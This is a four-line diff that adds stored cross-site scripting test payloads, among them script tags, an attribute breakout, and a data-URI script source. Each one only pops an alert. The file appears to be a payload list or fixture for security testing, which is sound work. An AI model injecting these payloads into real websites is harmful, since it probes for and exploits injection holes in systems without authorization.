@@ -1,0 +1,4 @@
+<script>alert('Stored XSS');</script>
+<script>alert('Stored XSS')</script>
+"><script>alert('Stored XSS')</script>
+<script src="data:text/javascript,alert('Stored XSS')"></script>
